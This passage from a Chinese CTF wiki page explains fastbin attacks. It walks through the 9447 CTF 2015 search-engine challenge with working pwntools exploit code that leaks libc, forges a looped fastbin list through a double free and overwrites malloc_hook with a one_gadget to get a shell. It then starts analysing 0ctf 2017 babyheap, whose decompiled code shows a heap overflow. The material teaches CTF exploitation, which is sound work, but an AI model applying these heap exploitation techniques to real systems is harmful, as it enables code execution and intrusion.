</code></pre></div> <p>可以看出，在每次释放 i-&gt;sentence_ptr 之前，这个句子的内容就会全部被设置为 <code>\x00</code> ，由于单词结构体中存储的单词只是句子的一个指针，所以单词也会被置为 <code>\x00</code> 。该句子对应的那些单词仍然是存在于链表中的，并没有被删除，因此每次搜索单词的时候，仍然会判断。看起来由于句子内容被置为 <code>\x00</code> 可以防止通过 <code>*i-&gt;sentence_ptr</code> 验证。然而，由于 chunk 被释放后会被放到 bin 中，当 chunk 不是 fastbin 或者 chunk 被重新分配出去使用的时候，也就有可能会产生 double free 的情况。此外，当句子被 <code>memset</code> 的时候，单词虽然都变为了 <code>\x00</code> ，但是我们仍然可以通过两个 <code>\x00</code> 的比较来绕过 <code>memcmp</code> 的检测。</p> <h3 id=_23>利用<a class=headerlink href=#_23 title="Permanent link">&para;</a></h3> <h4 id=_24>利用思路<a class=headerlink href=#_24 title="Permanent link">&para;</a></h4> <p>基本利用思路如下</p> <ul> <li>利用 unsorted bin 地址泄漏 libc 基地址</li> <li>利用 double free 构造 fastbin 循环链表</li> <li>分配 chunk 到 malloc_hook 附近，修改malloc_hook 为 one_gadget</li> </ul> <h4 id=libc>泄漏 libc 地址<a class=headerlink href=#libc title="Permanent link">&para;</a></h4> <p>这里我们分配一个 small bin 大小的 chunk ，当它被释放后，就会放入到 unsorted bin 中。因而，只要 <code>unsorted bin</code> 的地址的起始字节不是 <code>\x00</code> 便可以通过验证。同时，我们可以构造 <code>\x00</code> 来进行比较，从而通过验证。具体如下</p> <div class=highlight><pre><span></span><code><span class=k>def</span><span class=w> </span><span class=nf>leak_libc</span><span class=p>():</span>
    <span class=n>smallbin_sentence</span> <span class=o>=</span> <span class=s1>&#39;s&#39;</span> <span class=o>*</span> <span class=mh>0x85</span> <span class=o>+</span> <span class=s1>&#39; m &#39;</span>
    <span class=n>index_sentence</span><span class=p>(</span><span class=n>smallbin_sentence</span><span class=p>)</span>
    <span class=n>search_word</span><span class=p>(</span><span class=s1>&#39;m&#39;</span><span class=p>)</span>
    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Delete this sentence (y/n)?</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;y&#39;</span><span class=p>)</span>
    <span class=n>search_word</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Found &#39;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>smallbin_sentence</span><span class=p>))</span> <span class=o>+</span> <span class=s1>&#39;: &#39;</span><span class=p>)</span>
    <span class=n>unsortedbin_addr</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>8</span><span class=p>))</span>
    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Delete this sentence (y/n)?</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;n&#39;</span><span class=p>)</span>
    <span class=k>return</span> <span class=n>unsortedbin_addr</span>
</code></pre></div> <h4 id=fastbin>构造 fastbin 循环链表<a class=headerlink href=#fastbin title="Permanent link">&para;</a></h4> <p>由于我们最后希望在 malloc_hook 处分配 chunk，而一般分配 malloc_hook 附近的 chunk 一般大小都是0x7f。即，我们所需要设置的设置的 fast bin 的数据字节部分的大小为 0x60。这里我们按照如下方式构造</p> <ol> <li>分别索引句子a，索引句子b，索引句子c，则此时单词链表中索引的句子的相对顺序为c-&gt;b-&gt;a。假设句子 a 为'a' * 0x5d+' d '，句子 b 为 'b' * 0x5d+' d '，句子c类似。</li> <li>索引单词d，三个均删除，则此时 fastbin 中的链表情况为 a-&gt;b-&gt;c-&gt;NULL，这是因为首先释放的是句子c，最后释放的是句子 a 。这时，搜索单词时<code>*i-&gt;sentence_ptr</code> 对于a, b 来说都是可以绕过的。</li> <li>我们此时再次删除搜索单词 <code>\x00</code>。首先遍历的是 c，但是 c 的验证不通过；其次遍历的是b，验证通过，我们将其释放；其次遍历的是a，验证通过，但是我们不删除。则此时 fastbin 的情况为 b-&gt;a-&gt;b-&gt;a-&gt;...。即已经构成了double free b的情况。由于我们先前为了 leak libc 还建立一个句子，所以还有一个单词可以比较，这里我们也不删除。</li> </ol> <p>具体代码如下</p> <div class=highlight><pre><span></span><code>    <span class=c1># 2. create cycle fastbin 0x70 size</span>
    <span class=n>index_sentence</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mh>0x5d</span> <span class=o>+</span> <span class=s1>&#39; d &#39;</span><span class=p>)</span>  <span class=c1>#a</span>
    <span class=n>index_sentence</span><span class=p>(</span><span class=s1>&#39;b&#39;</span> <span class=o>*</span> <span class=mh>0x5d</span> <span class=o>+</span> <span class=s1>&#39; d &#39;</span><span class=p>)</span>  <span class=c1>#b</span>
    <span class=n>index_sentence</span><span class=p>(</span><span class=s1>&#39;c&#39;</span> <span class=o>*</span> <span class=mh>0x5d</span> <span class=o>+</span> <span class=s1>&#39; d &#39;</span><span class=p>)</span>  <span class=c1>#c</span>

    <span class=c1># a-&gt;b-&gt;c-&gt;NULL</span>
    <span class=n>search_word</span><span class=p>(</span><span class=s1>&#39;d&#39;</span><span class=p>)</span>
    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Delete this sentence (y/n)?</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;y&#39;</span><span class=p>)</span>
    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Delete this sentence (y/n)?</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;y&#39;</span><span class=p>)</span>
    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Delete this sentence (y/n)?</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;y&#39;</span><span class=p>)</span>

    <span class=c1># b-&gt;a-&gt;b-&gt;a-&gt;...</span>
    <span class=n>search_word</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Delete this sentence (y/n)?</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;y&#39;</span><span class=p>)</span>
    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Delete this sentence (y/n)?</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;n&#39;</span><span class=p>)</span>
    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Delete this sentence (y/n)?</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;n&#39;</span><span class=p>)</span>
</code></pre></div> <p>效果如下</p> <div class=highlight><pre><span></span><code>pwndbg&gt;<span class=w> </span>fastbins
fastbins
0x20:<span class=w> </span>0x0
0x30:<span class=w> </span>0x1d19320<span class=w> </span>◂—<span class=w> </span>0x0
0x40:<span class=w> </span>0x0
0x50:<span class=w> </span>0x0
0x60:<span class=w> </span>0x0
0x70:<span class=w> </span>0x1d191b0<span class=w> </span>—▸<span class=w> </span>0x1d19010<span class=w> </span>—▸<span class=w> </span>0x1d191b0<span class=w> </span>◂—<span class=w> </span>0x1d19010
0x80:<span class=w> </span>0x0
</code></pre></div> <h4 id=malloc_hook-chunk>分配 malloc_hook 附近chunk<a class=headerlink href=#malloc_hook-chunk title="Permanent link">&para;</a></h4> <p>此时，fastbin 的链表为 b-&gt;a-&gt;b-&gt;a-&gt;…，则我们可以在申请第一个相同大小的 chunk 时，设置 b 的 fd 为 malloc_hook 附近处的 chunk <code>0x7fd798586aed</code>（这里是举一个例子，代码中需使用相对地址）。</p> <div class=highlight><pre><span></span><code>pwndbg&gt;<span class=w> </span>print<span class=w> </span><span class=o>(</span>void*<span class=o>)</span><span class=p>&amp;</span>main_arena
<span class=nv>$1</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=o>(</span>void<span class=w> </span>*<span class=o>)</span><span class=w> </span>0x7fd798586b20<span class=w> </span>&lt;main_arena&gt;
pwndbg&gt;<span class=w> </span>x/8gx<span class=w> </span>0x7fd798586b20-16
0x7fd798586b10<span class=w> </span>&lt;__malloc_hook&gt;:<span class=w> </span>0x0000000000000000<span class=w>  </span>0x0000000000000000
0x7fd798586b20<span class=w> </span>&lt;main_arena&gt;:<span class=w>    </span>0x0000000000000000<span class=w>  </span>0x0000000000bce130
0x7fd798586b30<span class=w> </span>&lt;main_arena+16&gt;:<span class=w> </span>0x0000000000000000<span class=w>  </span>0x0000000000000000
0x7fd798586b40<span class=w> </span>&lt;main_arena+32&gt;:<span class=w> </span>0x0000000000000000<span class=w>  </span>0x0000000000000000
pwndbg&gt;<span class=w> </span>find_fake_fast<span class=w> </span>0x7fd798586b10<span class=w> </span>0x7f
FAKE<span class=w> </span>CHUNKS
0x7fd798586aed<span class=w> </span>PREV_INUSE<span class=w> </span>IS_MMAPED<span class=w> </span>NON_MAIN_ARENA<span class=w> </span><span class=o>{</span>
<span class=w>  </span><span class=nv>prev_size</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=m>15535264025435701248</span>,
<span class=w>  </span><span class=nv>size</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=m>127</span>,
<span class=w>  </span><span class=nv>fd</span><span class=w> </span><span class=o>=</span><span class=w> </span>0xd798247e20000000,
<span class=w>  </span><span class=nv>bk</span><span class=w> </span><span class=o>=</span><span class=w> </span>0xd798247a0000007f,
<span class=w>  </span><span class=nv>fd_nextsize</span><span class=w> </span><span class=o>=</span><span class=w> </span>0x7f,
<span class=w>  </span><span class=nv>bk_nextsize</span><span class=w> </span><span class=o>=</span><span class=w> </span>0x0
<span class=o>}</span>
pwndbg&gt;<span class=w> </span>print<span class=w> </span>/x<span class=w> </span>0x7fd798586b10-0x7fd798586aed
<span class=nv>$2</span><span class=w> </span><span class=o>=</span><span class=w> </span>0x23
pwndbg&gt;<span class=w> </span>print<span class=w> </span>/x<span class=w> </span>0x7fd798586b20-0x7fd798586aed
<span class=nv>$3</span><span class=w> </span><span class=o>=</span><span class=w> </span>0x33
</code></pre></div> <p>那么当再次分配 b 的时候，由于此时 b 的 fd 已经被我们修改为了malloc_hook附近的地址，所以这时候我们再次分配一个 chunk，就会指向 <code>0x7fd798586aed</code>。 此后便只需要将 malloc_hook 修改为 one_gadget 地址就可以拿到 shell 了。</p> <div class=highlight><pre><span></span><code>    <span class=c1># 3. fastbin attack to malloc_hook nearby chunk</span>
    <span class=n>fake_chunk_addr</span> <span class=o>=</span> <span class=n>main_arena_addr</span> <span class=o>-</span> <span class=mh>0x33</span>
    <span class=n>fake_chunk</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>fake_chunk_addr</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x60</span><span class=p>,</span> <span class=s1>&#39;f&#39;</span><span class=p>)</span>

    <span class=n>index_sentence</span><span class=p>(</span><span class=n>fake_chunk</span><span class=p>)</span>

    <span class=n>index_sentence</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mh>0x60</span><span class=p>)</span>

    <span class=n>index_sentence</span><span class=p>(</span><span class=s1>&#39;b&#39;</span> <span class=o>*</span> <span class=mh>0x60</span><span class=p>)</span>

    <span class=n>one_gadget_addr</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0xf02a4</span>
    <span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mh>0x13</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>one_gadget_addr</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>=</span> <span class=n>payload</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x60</span><span class=p>,</span> <span class=s1>&#39;f&#39;</span><span class=p>)</span>
    <span class=c1>#gdb.attach(p)</span>
    <span class=n>index_sentence</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
    <span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></div> <p>这里可能需要多选择几个 one_gadget 地址，因为 one_gadget 成功是有条件的。</p> <h4 id=shell>shell<a class=headerlink href=#shell title="Permanent link">&para;</a></h4> <div class=highlight><pre><span></span><code>➜<span class=w>  </span>2015_9447ctf_search-engine<span class=w> </span>git:<span class=o>(</span>master<span class=o>)</span><span class=w> </span>python<span class=w> </span>exp.py
<span class=o>[</span>*<span class=o>]</span><span class=w> </span><span class=s1>&#39;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/fastbin_attack/2015_9447ctf_search-engine/search&#39;</span>
<span class=w>    </span>Arch:<span class=w>     </span>amd64-64-little
<span class=w>    </span>RELRO:<span class=w>    </span>Partial<span class=w> </span>RELRO
<span class=w>    </span>Stack:<span class=w>    </span>Canary<span class=w> </span>found
<span class=w>    </span>NX:<span class=w>       </span>NX<span class=w> </span>enabled
<span class=w>    </span>PIE:<span class=w>      </span>No<span class=w> </span>PIE<span class=w> </span><span class=o>(</span>0x400000<span class=o>)</span>
<span class=w>    </span>FORTIFY:<span class=w>  </span>Enabled
<span class=o>[</span>+<span class=o>]</span><span class=w> </span>Starting<span class=w> </span><span class=nb>local</span><span class=w> </span>process<span class=w> </span><span class=s1>&#39;./search&#39;</span>:<span class=w> </span>pid<span class=w> </span><span class=m>31158</span>
<span class=o>[</span>*<span class=o>]</span><span class=w> </span>PID:<span class=w> </span><span class=m>31158</span>
<span class=o>[</span>+<span class=o>]</span><span class=w> </span>unsortedbin<span class=w> </span>addr:<span class=w> </span>0x7f802e73bb78
<span class=o>[</span>+<span class=o>]</span><span class=w> </span>libc<span class=w> </span>base<span class=w> </span>addr:<span class=w> </span>0x7f802e377000
<span class=o>[</span>*<span class=o>]</span><span class=w> </span>Switching<span class=w> </span>to<span class=w> </span>interactive<span class=w> </span>mode
Enter<span class=w> </span>the<span class=w> </span>sentence:
$<span class=w> </span>ls
exp.py<span class=w>       </span>search<span class=w>      </span>search.id1<span class=w>  </span>search.nam
libc.so.6<span class=w>  </span>search.id0<span class=w>  </span>search.id2<span class=w>  </span>search.til
</code></pre></div> <p>当然，这里还有一种<a href=https://www.gulshansingh.com/posts/9447-ctf-2015-search-engine-writeup/ >方法</a>，将 chunk 分配到栈上。</p> <h2 id=2017-0ctf-babyheap>2017 0ctf babyheap<a class=headerlink href=#2017-0ctf-babyheap title="Permanent link">&para;</a></h2> <p><a href=https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/fastbin-attack/2017_0ctf_babyheap>题目链接</a></p> <h3 id=_25>基本信息<a class=headerlink href=#_25 title="Permanent link">&para;</a></h3> <div class=highlight><pre><span></span><code>➜<span class=w>  </span>2017_0ctf_babyheap<span class=w> </span>git:<span class=o>(</span>master<span class=o>)</span><span class=w> </span>file<span class=w> </span>babyheap
babyheap:<span class=w> </span>ELF<span class=w> </span><span class=m>64</span>-bit<span class=w> </span>LSB<span class=w> </span>shared<span class=w> </span>object,<span class=w> </span>x86-64,<span class=w> </span>version<span class=w> </span><span class=m>1</span><span class=w> </span><span class=o>(</span>SYSV<span class=o>)</span>,<span class=w> </span>dynamically<span class=w> </span>linked,<span class=w> </span>interpreter<span class=w> </span>/lib64/ld-linux-x86-64.so.2,<span class=w> </span><span class=k>for</span><span class=w> </span>GNU/Linux<span class=w> </span><span class=m>2</span>.6.32,<span class=w> </span>BuildID<span class=o>[</span>sha1<span class=o>]=</span>9e5bfa980355d6158a76acacb7bda01f4e3fc1c2,<span class=w> </span>stripped
➜<span class=w>  </span>2017_0ctf_babyheap<span class=w> </span>git:<span class=o>(</span>master<span class=o>)</span><span class=w> </span>checksec<span class=w> </span>babyheap
<span class=o>[</span>*<span class=o>]</span><span class=w> </span><span class=s1>&#39;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/fastbin_attack/2017_0ctf_babyheap/babyheap&#39;</span>
<span class=w>    </span>Arch:<span class=w>     </span>amd64-64-little
<span class=w>    </span>RELRO:<span class=w>    </span>Full<span class=w> </span>RELRO
<span class=w>    </span>Stack:<span class=w>    </span>Canary<span class=w> </span>found
<span class=w>    </span>NX:<span class=w>       </span>NX<span class=w> </span>enabled
<span class=w>    </span>PIE:<span class=w>      </span>PIE<span class=w> </span>enabled
</code></pre></div> <p>64位程序，保护全部开启。</p> <h3 id=_26>基本功能<a class=headerlink href=#_26 title="Permanent link">&para;</a></h3> <p>程序是一个堆分配器，主要由以下四种功能</p> <div class=highlight><pre><span></span><code><span class=w>  </span><span class=n>puts</span><span class=p>(</span><span class=s>&quot;1. Allocate&quot;</span><span class=p>);</span>
<span class=w>  </span><span class=n>puts</span><span class=p>(</span><span class=s>&quot;2. Fill&quot;</span><span class=p>);</span>
<span class=w>  </span><span class=n>puts</span><span class=p>(</span><span class=s>&quot;3. Free&quot;</span><span class=p>);</span>
<span class=w>  </span><span class=n>puts</span><span class=p>(</span><span class=s>&quot;4. Dump&quot;</span><span class=p>);</span>
<span class=w>  </span><span class=n>puts</span><span class=p>(</span><span class=s>&quot;5. Exit&quot;</span><span class=p>);</span>
<span class=w>  </span><span class=k>return</span><span class=w> </span><span class=n>printf</span><span class=p>(</span><span class=s>&quot;Command: &quot;</span><span class=p>);</span>
</code></pre></div> <p>其中，每次读取命令的函数由读取指定长度的字符串的函数而决定。</p> <p>通过分配函数</p> <div class=highlight><pre><span></span><code><span class=kt>void</span><span class=w> </span><span class=kr>__fastcall</span><span class=w> </span><span class=n>allocate</span><span class=p>(</span><span class=kr>__int64</span><span class=w> </span><span class=n>a1</span><span class=p>)</span>
<span class=p>{</span>
<span class=w>  </span><span class=kt>signed</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=p>;</span><span class=w> </span><span class=c1>// [rsp+10h] [rbp-10h]</span>
<span class=w>  </span><span class=kt>signed</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>v2</span><span class=p>;</span><span class=w> </span><span class=c1>// [rsp+14h] [rbp-Ch]</span>
<span class=w>  </span><span class=kt>void</span><span class=w> </span><span class=o>*</span><span class=n>v3</span><span class=p>;</span><span class=w> </span><span class=c1>// [rsp+18h] [rbp-8h]</span>

<span class=w>  </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;=</span><span class=w> </span><span class=mi>15</span><span class=p>;</span><span class=w> </span><span class=o>++</span><span class=n>i</span><span class=w> </span><span class=p>)</span>
<span class=w>  </span><span class=p>{</span>
<span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=o>!*</span><span class=p>(</span><span class=n>_DWORD</span><span class=w> </span><span class=o>*</span><span class=p>)(</span><span class=mf>24L</span><span class=n>L</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>a1</span><span class=p>)</span><span class=w> </span><span class=p>)</span>
<span class=w>    </span><span class=p>{</span>
<span class=w>      </span><span class=n>printf</span><span class=p>(</span><span class=s>&quot;Size: &quot;</span><span class=p>);</span>
<span class=w>      </span><span class=n>v2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>read_num</span><span class=p>();</span>
<span class=w>      </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=n>v2</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=mi>0</span><span class=w> </span><span class=p>)</span>
<span class=w>      </span><span class=p>{</span>
<span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=n>v2</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=mi>4096</span><span class=w> </span><span class=p>)</span>
<span class=w>          </span><span class=n>v2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>4096</span><span class=p>;</span>
<span class=w>        </span><span class=n>v3</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>calloc</span><span class=p>(</span><span class=n>v2</span><span class=p>,</span><span class=w> </span><span class=mi>1uLL</span><span class=p>);</span>
<span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=o>!</span><span class=n>v3</span><span class=w> </span><span class=p>)</span>
<span class=w>          </span><span class=n>exit</span><span class=p>(</span><span class=mi>-1</span><span class=p>);</span>
<span class=w>        </span><span class=o>*</span><span class=p>(</span><span class=n>_DWORD</span><span class=w> </span><span class=o>*</span><span class=p>)(</span><span class=mf>24L</span><span class=n>L</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>a1</span><span class=p>)</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>1</span><span class=p>;</span>
<span class=w>        </span><span class=o>*</span><span class=p>(</span><span class=n>_QWORD</span><span class=w> </span><span class=o>*</span><span class=p>)(</span><span class=n>a1</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mf>24L</span><span class=n>L</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>8</span><span class=p>)</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>v2</span><span class=p>;</span>
<span class=w>        </span><span class=o>*</span><span class=p>(</span><span class=n>_QWORD</span><span class=w> </span><span class=o>*</span><span class=p>)(</span><span class=n>a1</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mf>24L</span><span class=n>L</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>16</span><span class=p>)</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>v3</span><span class=p>;</span>
<span class=w>        </span><span class=n>printf</span><span class=p>(</span><span class=s>&quot;Allocate Index %d</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>,</span><span class=w> </span><span class=p>(</span><span class=kt>unsigned</span><span class=w> </span><span class=kt>int</span><span class=p>)</span><span class=n>i</span><span class=p>);</span>
<span class=w>      </span><span class=p>}</span>
<span class=w>      </span><span class=k>return</span><span class=p>;</span>
<span class=w>    </span><span class=p>}</span>
<span class=w>  </span><span class=p>}</span>
<span class=p>}</span>
</code></pre></div> <p>申请的 chunk 的最大为 4096。此外，我们可以看出每个 chunk 主要有三个字段：是否在使用，堆块大小，堆块位置。故而我们可以创建对应的结构体。</p> <div class=highlight><pre><span></span><code>00000000 chunk           struc ; (sizeof=0x18, mappedto_6)
00000000 inuse           dq ?
00000008 size            dq ?
00000010 ptr             dq ?
00000018 chunk           ends
</code></pre></div> <p><strong>需要注意的是堆块是由 calloc 分配的，所以 chunk 中的内容全都为<code>\x00</code>。</strong></p> <p>在填充内容的功能中，使用读取内容的函数是直接读取指定长度的内容，并没有设置字符串结尾。<strong>而且比较有意思的是，这个指定长度是我们指定的，并不是之前 chunk 分配时指定的长度，所以这里就出现了任意堆溢出的情形。</strong></p> <div class=highlight><pre><span></span><code><span class=kr>__int64</span><span class=w> </span><span class=kr>__fastcall</span><span class=w> </span><span class=n>fill</span><span class=p>(</span><span class=n>chunk</span><span class=w> </span><span class=o>*</span><span class=n>a1</span><span class=p>)</span>
<span class=p>{</span>
<span class=w>  </span><span class=kr>__int64</span><span class=w> </span><span class=n>result</span><span class=p>;</span><span class=w> </span><span class=c1>// rax</span>
<span class=w>  </span><span class=kt>int</span><span class=w> </span><span class=n>v2</span><span class=p>;</span><span class=w> </span><span class=c1>// [rsp+18h] [rbp-8h]</span>
<span class=w>  </span><span class=kt>int</span><span class=w> </span><span class=n>v3</span><span class=p>;</span><span class=w> </span><span class=c1>// [rsp+1Ch] [rbp-4h]</span>

<span class=w>  </span><span class=n>printf</span><span class=p>(</span><span class=s>&quot;Index: &quot;</span><span class=p>);</span>
<span class=w>  </span><span class=n>result</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>read_num</span><span class=p>();</span>
<span class=w>  </span><span class=n>v2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>result</span><span class=p>;</span>
<span class=w>  </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=p>(</span><span class=kt>signed</span><span class=w> </span><span class=kt>int</span><span class=p>)</span><span class=n>result</span><span class=w> </span><span class=o>&gt;=</span><span class=w> </span><span class=mi>0</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=p>(</span><span class=kt>signed</span><span class=w> </span><span class=kt>int</span><span class=p>)</span><span class=n>result</span><span class=w> </span><span class=o>&lt;=</span><span class=w> </span><span class=mi>15</span><span class=w> </span><span class=p>)</span>
<span class=w>  </span><span class=p>{</span>
<span class=w>    </span><span class=n>result</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>LODWORD</span><span class=p>(</span><span class=n>a1</span><span class=p>[(</span><span class=kt>signed</span><span class=w> </span><span class=kt>int</span><span class=p>)</span><span class=n>result</span><span class=p>].</span><span class=n>inuse</span><span class=p>);</span>
<span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=p>(</span><span class=n>_DWORD</span><span class=p>)</span><span class=n>result</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=p>)</span>
<span class=w>    </span><span class=p>{</span>
<span class=w>      </span><span class=n>printf</span><span class=p>(</span><span class=s>&quot;Size: &quot;</span><span class=p>);</span>
<span class=w>      </span><span class=n>result</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>read_num</span><span class=p>();</span>
<span class=w>      </span><span class=n>v3</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>result</span><span class=p>;</span>
<span class=w>      </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=p>(</span><span class=kt>signed</span><span class=w> </span><span class=kt>int</span><span class=p>)</span><span class=n>result</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=mi>0</span><span class=w> </span><span class=p>)</span>
<span class=w>      </span><span class=p>{</span>
<span class=w>        </span><span class=n>printf</span><span class=p>(</span><span class=s>&quot;Content: &quot;</span><span class=p>);</span>
<span class=w>        </span><span class=n>result</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>read_content</span><span class=p>((</span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=n>a1</span><span class=p>[</span><span class=n>v2</span><span class=p>].</span><span class=n>ptr</span><span class=p>,</span><span class=w> </span><span class=n>v3</span><span class=p>);</span>
<span class=w>      </span><span class=p>}</span>
<span class=w>    </span><span class=p>}</span>
<span class=w>  </span><span class=p>}</span>
<span class=w>  </span><span class=k>return</span><span class=w> </span><span class=n>result</span><span class=p>;</span>
<span class=p>}</span>
</code></pre></div> <p>在释放chunk的功能中该设置的都设置了。</p> <div class=highlight><pre><span></span><code><span class=kr>__int64</span><span class=w> </span><span class=kr>__fastcall</span><span class=w> </span><span class=n>free_chunk</span><span class=p>(</span><span class=n>chunk</span><span class=w> </span><span class=o>*</span><span class=n>a1</span><span class=p>)</span>
<span class=p>{</span>
<span class=w>  </span><span class=kr>__int64</span><span class=w> </span><span class=n>result</span><span class=p>;</span><span class=w> </span><span class=c1>// rax</span>
<span class=w>  </span><span class=kt>int</span><span class=w> </span><span class=n>v2</span><span class=p>;</span><span class=w> </span><span class=c1>// [rsp+1Ch] [rbp-4h]</span>

<span class=w>  </span><span class=n>printf</span><span class=p>(</span><span class=s>&quot;Index: &quot;</span><span class=p>);</span>
<span class=w>  </span><span class=n>result</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>read_num</span><span class=p>();</span>
<span class=w>  </span><span class=n>v2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>result</span><span class=p>;</span>
<span class=w>  </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=p>(</span><span class=kt>signed</span><span class=w> </span><span class=kt>int</span><span class=p>)</span><span class=n>result</span><span class=w> </span><span class=o>&gt;=</span><span class=w> </span><span class=mi>0</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=p>(</span><span class=kt>signed</span><span class=w> </span><span class=kt>int</span><span class=p>)</span><span class=n>result</span><span class=w> </span><span class=o>&lt;=</span><span class=w> </span><span class=mi>15</span><span class=w> </span><span class=p>)</span>
